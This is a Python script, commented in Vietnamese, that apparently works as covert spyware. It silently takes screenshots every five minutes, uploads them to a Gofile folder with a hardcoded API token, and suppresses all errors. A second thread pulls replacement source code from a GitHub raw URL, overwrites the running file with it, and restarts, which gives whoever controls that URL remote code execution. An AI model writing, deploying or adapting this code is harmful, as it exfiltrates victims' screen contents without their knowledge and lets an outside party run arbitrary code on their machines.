import os
import sys
import time
import threading
import requests
import pyautogui
from datetime import datetime

# --- THÔNG TIN CẤU HÌNH CẬP NHẬT ---
CURRENT_VERSION = "2.0.2" 
VERSION_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/version_v2"
UPDATE_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/monitor_v2.py"
GOFILE_API = "https://upload.gofile.io/uploadfile"
GOFILE_TOKEN = "bhovKSmWOpP1I98OFlxS8LlIygr9TZx5"
FOLDER_ID = "a4d5e9ee-2d16-4b2d-910a-ae481bc44d3b"

class SystemMonitorSilent:
    def __init__(self):
        self.running = True

    def capture_and_upload(self):
        """Tiến trình chụp màn hình và upload chạy ngầm hoàn toàn"""
        while self.running:
            temp_file = ""
            try:
                # 1. Tạo tên file theo timestamp
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                temp_file = f"SC_{timestamp}.png"
                
                # 2. Chụp màn hình (Silent)
                pic = pyautogui.screenshot()
                pic.save(temp_file, optimize=True, quality=80)

                # 3. Tải lên API Gofile
                if os.path.exists(temp_file):
                    with open(temp_file, 'rb') as f:
                        files = {'file': f}
                        data = {
                            'token': GOFILE_TOKEN,
                            'folderId': FOLDER_ID
                        }
                        # Timeout để tránh treo luồng nếu mạng yếu
                        requests.post(GOFILE_API, files=files, data=data, timeout=30)
                
            except Exception as e:
                # Ghi lỗi ra log file thay vì hiện thông báo (tùy chọn)
                pass 
            
            finally:
                # 4. Xóa tệp tạm ngay lập tức
                if temp_file and os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except:
                        pass

            time.sleep(300) # Chu kỳ 5 phút

    def auto_update(self):
        """Kiểm tra phiên bản mới từ GitHub và tự cập nhật mã nguồn"""
        while self.running:
            try:
                resp = requests.get(VERSION_URL, timeout=15)
                new_version = resp.text.strip()

                # Nếu phiên bản trên server khác phiên bản hiện tại
                if new_version != CURRENT_VERSION:
                    update_resp = requests.get(UPDATE_URL, timeout=30)
                    if update_resp.status_code == 200:
                        # Ghi đè mã nguồn mới vào chính file đang chạy
                        with open(__file__, "w", encoding="utf-8") as f:
                            f.write(update_resp.text)
                        
                        # Khởi động lại ứng dụng để áp dụng code mới
                        os.execv(sys.executable, [sys.executable] + sys.argv)
                
            except Exception:
                pass

            time.sleep(600) # Kiểm tra cập nhật mỗi 10 phút

    def start(self):
        # Khởi chạy các tác vụ trong luồng riêng biệt
        t_capture = threading.Thread(target=self.capture_and_upload, daemon=True)
        t_update = threading.Thread(target=self.auto_update, daemon=True)

        t_capture.start()
        t_update.start()

        # Giữ tiến trình chính luôn sống
        while self.running:
            time.sleep(1)

if __name__ == "__main__":
    monitor = SystemMonitorSilent()
    monitor.start()
